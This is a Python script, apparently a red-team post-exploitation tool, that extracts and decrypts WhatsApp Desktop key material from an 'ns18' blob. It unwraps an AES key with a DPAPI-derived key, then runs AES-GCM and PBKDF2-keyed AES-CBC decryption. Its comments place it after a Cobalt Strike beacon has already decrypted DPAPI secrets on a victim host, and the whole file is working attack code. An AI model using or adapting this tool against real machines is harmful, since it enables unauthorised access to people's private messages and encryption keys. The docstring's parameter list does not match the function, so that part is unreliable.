import binascii
import sys
import base64
from Crypto.Cipher import AES
from cryptography.hazmat.primitives.keywrap import aes_key_unwrap
from cryptography.hazmat.primitives.ciphers import algorithms
from Crypto.Util.Padding import unpad
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Hash import SHA256
import struct

def ns_decrypt(whatsapp_app_uid, wrapped_key, nonce, cipher_text, gcm_tag, user_key, kek, has_padding):
    """
    Implements the nsDecrypt function in Python.
    
    :param dpapi_blob: DPAPI-encrypted key (already decrypted via Cobalt Strike BOF)
    :param wrapped_key: AES-wrapped key
    :param nonce: AES-GCM nonce
    :param cipher_text: Encrypted data
    :param gcm_tag: GCM authentication tag
    :param passphrase: Passphrase for PBKDF2 key derivation
    :param has_padding: Boolean flag for padding mode
    :return: Decrypted plaintext bytes
    """

    # Simulate DPAPI decryption (assumes DPAPI unprotect is already handled on the beacon)
    kek = base64.b64decode(kek)  # In PowerShell, this was decrypted with DPAPI
    wrapped_key = bytes.fromhex(wrapped_key)
    nonce = bytes.fromhex(nonce)
    cipher_text = bytes.fromhex(cipher_text)
    gcm_tag = bytes.fromhex(gcm_tag)

    # Unwrap AES key
    gcm_key = aes_key_unwrap(kek, wrapped_key, algorithms.AES)


    # AES-GCM decryption
    gcm_cipher = AES.new(gcm_key, AES.MODE_GCM, nonce=nonce)
    cipher_text_tagged = cipher_text + gcm_tag

    try:
        second_cipher_text = gcm_cipher.decrypt_and_verify(cipher_text, gcm_tag)
    except ValueError:
        print("GCM authentication failed!")
        return None

    # PBKDF2 key derivation
    iterations = 10000
    enc_key = PBKDF2(bytes.fromhex(user_key), bytes.fromhex(whatsapp_app_uid), dkLen=32, count=iterations, hmac_hash_module=SHA256)
    iv = PBKDF2(enc_key, bytes.fromhex(whatsapp_app_uid), dkLen=16, count=iterations, hmac_hash_module=SHA256)

    # AES-CBC decryption
    cbc_cipher = AES.new(enc_key, AES.MODE_CBC, iv)

    decrypted_bytes = cbc_cipher.decrypt(second_cipher_text)

    if has_padding:
        decrypted_bytes = unpad(decrypted_bytes, AES.block_size)

    return decrypted_bytes

def read_bytes_from_data(data, offset, length):
    """Reads bytes from a given byte sequence at a specific offset and length."""
    return data[offset:offset + length]

def retrieve_keys_ns18(n18_data):
    # Read wrappedKey
    wrapped_key_size = read_bytes_from_data(n18_data, 0x16F, 1)[0]
    # print(f"wrapped_key_size: {wrapped_key_size}")

    wrapped_key = read_bytes_from_data(n18_data, 0x170, wrapped_key_size)
    # print(f"wrapped_key: {binascii.hexlify(wrapped_key).decode().upper()}")

    # Read nonce
    nonce_size = read_bytes_from_data(n18_data, 0x1B5, 1)[0]
    # print(f"nonce_size: {nonce_size}")

    nonce = read_bytes_from_data(n18_data, 0x1B6, nonce_size)
    # print(f"nonce: {binascii.hexlify(nonce).decode().upper()}")

    # Read cipherText
    cipher_text_size = read_bytes_from_data(n18_data, 0x1C6, 1)[0] - 16
    # print(f"cipher_text_size: {cipher_text_size}")

    cipher_text = read_bytes_from_data(n18_data, 0x1C7, cipher_text_size)
    # print(f"cipher_text: {binascii.hexlify(cipher_text).decode().upper()}")

    # Read gcmTag
    gcm_tag = read_bytes_from_data(n18_data, 0x1C7 + cipher_text_size, 16)
    # print(f"gcmTag: {binascii.hexlify(gcm_tag).decode().upper()}")

    return (binascii.hexlify(wrapped_key).decode().upper(), binascii.hexlify(nonce).decode().upper(), binascii.hexlify(cipher_text).decode().upper(), binascii.hexlify(gcm_tag).decode().upper())

wrapped_key,nonce,cipher_text,gcm_tag = retrieve_keys_ns18(bytes.fromhex(sys.argv[3]))

decrypted_data = ns_decrypt(sys.argv[4],wrapped_key,nonce,cipher_text,gcm_tag,sys.argv[1],sys.argv[2],0)

if decrypted_data:
    print(decrypted_data.hex())